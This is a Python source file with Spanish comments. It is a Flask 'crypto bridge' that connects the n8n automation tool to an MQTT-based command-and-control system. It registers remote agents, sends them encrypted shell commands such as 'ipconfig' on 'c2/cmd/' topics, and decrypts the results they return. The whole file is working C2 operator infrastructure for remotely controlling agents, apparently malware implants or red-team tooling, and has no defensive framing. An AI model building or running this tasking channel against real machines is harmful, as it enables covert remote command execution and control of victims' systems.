#!/usr/bin/env python3
"""
Crypto Bridge — HTTP API para que n8n cifre/descifre mensajes MQTT sin Node.js.

n8n habla HTTP, el bridge habla MQTT con TLS + AES-GCM.

Uso:
    python3 bridge.py

Endpoints:
    POST /api/command   → cifra y publica un comando a un agente
    GET  /api/results   → obtiene resultados pendientes (buffer)
    GET  /api/agents    → obtiene registros pendientes (buffer)
    GET  /api/health    → estado del bridge
"""

import os
import json
import sys
from collections import deque
from pathlib import Path

from flask import Flask, request, jsonify
import paho.mqtt.client as mqtt

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from crypto_lib.cipher import Cipher

# ──────────────────────────────────────────────
# Configuración desde variables de entorno
# ──────────────────────────────────────────────

MQTT_HOST = os.getenv("MQTT_HOST", "localhost")
MQTT_PORT = int(os.getenv("MQTT_PORT", "8883"))
MQTT_CLIENT_ID = os.getenv("MQTT_CLIENT_ID", "crypto-bridge")

PSK_FILE = os.getenv("PSK_FILE", "crypto_lib/psk.key")
STATE_FILE = os.getenv("STATE_FILE", "/tmp/bridge.state")

CA_CERT = os.getenv("CA_CERT", "config/certs/ca.crt")
CLIENT_CERT = os.getenv("CLIENT_CERT", "config/certs/bridge.crt")
CLIENT_KEY = os.getenv("CLIENT_KEY", "config/certs/bridge.key")

BRIDGE_HOST = os.getenv("BRIDGE_HOST", "0.0.0.0")
BRIDGE_PORT = int(os.getenv("BRIDGE_PORT", "5000"))

# ──────────────────────────────────────────────
# Inicializar crypto
# ──────────────────────────────────────────────

if not Path(PSK_FILE).exists():
    print(f"[!] PSK file not found: {PSK_FILE}")
    print(f"[!] Generate one with: python3 crypto_lib/cipher.py genkey {PSK_FILE}")
    sys.exit(1)

with open(PSK_FILE, "rb") as f:
    key = f.read()

cipher = Cipher(key, state_file=STATE_FILE)
print(f"[+] Cipher ready (key: {len(key)} bytes, state: {STATE_FILE})")

# ──────────────────────────────────────────────
# Buffers de mensajes (para que n8n los consuma)
# ──────────────────────────────────────────────

results_buffer: deque = deque(maxlen=1000)
registers_buffer: deque = deque(maxlen=1000)

# ──────────────────────────────────────────────
# MQTT client
# ──────────────────────────────────────────────

app = Flask(__name__)


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[MQTT] Connected to {MQTT_HOST}:{MQTT_PORT}")
        client.subscribe("c2/agents/register", qos=1)
        client.subscribe("c2/res/#", qos=1)
        print("[MQTT] Subscribed to c2/agents/register, c2/res/#")
    else:
        print(f"[MQTT] Connection failed (rc={rc})")


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload)

        if msg.topic == "c2/agents/register":
            registers_buffer.append(payload)
            print(f"[BUF] Register from {payload.get('agent_id', '?')}")

        elif msg.topic.startswith("c2/res/"):
            # El payload está cifrado — el bridge lo descifra antes de
            # entregarlo a n8n para que n8n nunca toque crypto
            try:
                decrypted = cipher.decrypt(payload)
                result = json.loads(decrypted)
                results_buffer.append(result)
                print(f"[BUF] Result from {result.get('agent_id', '?')}: "
                      f"{result.get('task_id', '?')} → {result.get('status', '?')}")
            except Exception as e:
                print(f"[!] Failed to decrypt result: {e}")
                results_buffer.append({"error": str(e), "raw": payload})

    except json.JSONDecodeError:
        print(f"[!] Non-JSON message on {msg.topic}")
    except Exception as e:
        print(f"[!] Error processing {msg.topic}: {e}")


mqtt_client = mqtt.Client(client_id=MQTT_CLIENT_ID)
mqtt_client.tls_set(CA_CERT, certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
mqtt_client.on_connect = on_connect
mqtt_client.on_message = on_message

# ──────────────────────────────────────────────
# Endpoints HTTP para n8n
# ──────────────────────────────────────────────


@app.route("/api/command", methods=["POST"])
def send_command():
    """Cifra y publica un comando a un agente.

    Body:
    {
        "agent_id": "AG001",
        "command": "ipconfig",
        "command_type": "shell",
        "task_id": "TASK001"
    }
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "JSON body required"}), 400

    agent_id = data.get("agent_id")
    command = data.get("command")
    if not agent_id or not command:
        return jsonify({"error": "agent_id and command are required"}), 400

    payload = {
        "task_id": data.get("task_id"),
        "command": command,
        "command_type": data.get("command_type", "shell"),
    }

    try:
        encrypted = cipher.encrypt_to_json(payload)
    except Exception as e:
        return jsonify({"error": f"Encryption failed: {e}"}), 500

    topic = f"c2/cmd/{agent_id}"
    info = mqtt_client.publish(topic, encrypted, qos=1)

    if info.rc == mqtt.MQTT_ERR_SUCCESS:
        print(f"[CMD] Published to {topic} (task: {data.get('task_id', '?')})")
        return jsonify({
            "status": "published",
            "topic": topic,
            "task_id": data.get("task_id"),
            "agent_id": agent_id,
        })
    else:
        return jsonify({"error": f"MQTT publish failed (rc={info.rc})"}), 500


@app.route("/api/results", methods=["GET"])
def get_results():
    """Devuelve y limpia el buffer de resultados."""
    results = list(results_buffer)
    results_buffer.clear()
    return jsonify(results)


@app.route("/api/agents", methods=["GET"])
def get_agents():
    """Devuelve y limpia el buffer de registros de agentes."""
    agents = list(registers_buffer)
    registers_buffer.clear()
    return jsonify(agents)


@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "mqtt_connected": mqtt_client.is_connected(),
        "mqtt_host": MQTT_HOST,
        "mqtt_port": MQTT_PORT,
        "results_buffered": len(results_buffer),
        "registers_buffered": len(registers_buffer),
    })


# ──────────────────────────────────────────────
# Arranque
# ──────────────────────────────────────────────

def main():
    print("[+] Starting Crypto Bridge...")
    print(f"    MQTT: {MQTT_HOST}:{MQTT_PORT}")
    print(f"    HTTP: {BRIDGE_HOST}:{BRIDGE_PORT}")
    print(f"    PSK:  {PSK_FILE}")
    print(f"    Certs: {CA_CERT}, {CLIENT_CERT}")

    try:
        mqtt_client.connect(MQTT_HOST, MQTT_PORT)
        mqtt_client.loop_start()
    except Exception as e:
        print(f"[!] MQTT connection failed: {e}")
        print("[!] Bridge will start but MQTT is unavailable")

    app.run(host=BRIDGE_HOST, port=BRIDGE_PORT)


if __name__ == "__main__":
    main()
